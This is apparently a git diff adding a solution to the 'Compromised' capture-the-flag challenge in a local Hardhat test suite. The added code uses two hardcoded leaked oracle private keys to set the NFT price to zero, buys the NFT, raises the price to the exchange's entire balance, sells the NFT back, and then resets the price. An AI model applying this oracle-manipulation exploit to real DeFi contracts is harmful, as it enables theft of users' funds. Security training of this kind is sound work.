@@ -16,7 +16,6 @@ describe('Compromised challenge', function () {
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
-
         const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
         const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
         const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
@@ -61,6 +60,26 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        let privateKey1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+        let privateKey2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+        let provider = await ethers.getDefaultProvider();
+        var walletOne = new ethers.Wallet(privateKey1, ethers.provider);
+        var walletTwo = new ethers.Wallet(privateKey2, ethers.provider);
+
+        await this.oracle.connect(walletOne).postPrice("DVNFT", 0);
+        await this.oracle.connect(walletTwo).postPrice("DVNFT", 0);
+
+        const tx1 = await this.exchange.connect(attacker).buyOne({value: ethers.utils.parseEther("0.01")});
+        let sellPrice = await ethers.provider.getBalance(this.exchange.address);
+        await this.oracle.connect(walletOne).postPrice("DVNFT", sellPrice);
+        await this.oracle.connect(walletTwo).postPrice("DVNFT", sellPrice);
+
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        await this.oracle.connect(walletOne).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await this.oracle.connect(walletTwo).postPrice("DVNFT", INITIAL_NFT_PRICE);
+
     });
 
     after(async function () {
